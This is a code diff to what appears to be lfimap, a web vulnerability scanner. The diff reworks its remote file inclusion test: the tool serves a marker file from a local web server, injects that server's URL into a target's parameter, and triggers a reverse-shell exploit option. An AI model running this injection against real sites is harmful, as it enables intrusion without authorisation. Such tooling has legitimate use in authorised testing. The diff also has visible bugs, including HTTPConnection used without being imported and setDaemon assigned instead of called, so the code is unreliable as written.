@@ -11,6 +11,7 @@ import requests
 import requests.exceptions
 import threading
 import time
+import http.client
 
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 from argparse import RawTextHelpFormatter
@@ -20,15 +21,16 @@ class MyHandler(SimpleHTTPRequestHandler):
     
     def do_GET(self):
         if(self.path =='/'):
-            self.path = 'index.html'
-            self.wfile.write(bytes("<p>961bb08a95dbc34397248d92352da799</p></br>961bb08a95dbc34397248d92352da799", "utf-8"))
-
+            self.wfile.write(bytes("961bb08a95dbc34397248d92352da799", "utf-8"))
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
         else: return SimpleHTTPRequestHandler.do_GET(self)
-
-
+    
+    def do_QUIT(self):
+        self.send_response(200)
+        self.end_headers()
+        self.server.stop = True
 
 exploits = []
 proxies = {}
@@ -314,19 +316,32 @@ def test_rfi(url):
     if(args.verbose):
         print("Testing for RFI ...")
 
-    
+    rfi  = False
     #Local RFI test
     if(args.lhost):
         try:
             server = HTTPServer((args.lhost, 75), MyHandler)
-            threading.Thread(target = server.serve_forever).start()
+            webThread = threading.Thread(target = server.serve_forever)
+            webThread.setDaemon = True
+            webThread.start()
+            
+            #Creating temporary file for testing RFI
+            f = open("rfitest.txt", "w")
+            f.write("961bb08a95dbc34397248d92352da799")
+            f.close()
+
+            con = HTTPConnection("localhost:%d" % 75)
+            con.request("QUIT", "/")
+
         except KeyboardInterrupt:
             print("Keyboard interrupt, stopping web server")
+        except OSError:
+            print("Cannot setup local web server with provided lhost address")
         except:
-            print("Error while setting up local web server for RFI test: make sure lfimap is run as root")
+            pass
 
         if('DESTROY' in url):
-            pyld = "http%3a//"+args.lhost+":75/"
+            pyld = "http%3a//"+args.lhost+":75/rfitest.txt"
             u = url.replace('DESTROY', pyld)
             try:
                 res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
@@ -334,22 +349,28 @@ def test_rfi(url):
                     tempUrl = u.replace(pyld, 'TMP')
                     getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
                     print("[+] RFI -> " + u)
-                    
+                    rfi = True
             except:
                 pass
-    
-    #Internet RFI test
-    if("DESTROY" in url):
-        pyld = "https%3a//www.google.com/"
-        u = url.replace("DESTROY", pyld)
-    try:
-        res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
-        if(checkPayload(res)):
-            tempUrl = u.replace(pyld, 'TMP')
-            getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
-            print("[+] RFI -> " + u)
-    except:
-        pass
+
+    #Deleting temporary file
+    if(os.path.exists("rfitest.txt")):
+        os.remove("rfitest.txt")
+
+    if(not rfi):
+        #Internet RFI test
+        if("DESTROY" in url):
+            pyld = "https%3a//www.google.com/"
+            u = url.replace("DESTROY", pyld)
+        try:
+            res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
+            if(checkPayload(res)):
+                tempUrl = u.replace(pyld, 'TMP')
+                getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
+                print("[+] RFI -> " + u)
+
+        except:
+            pass
 
     if(args.revshell):
         exploit(exploits, 'RFI')
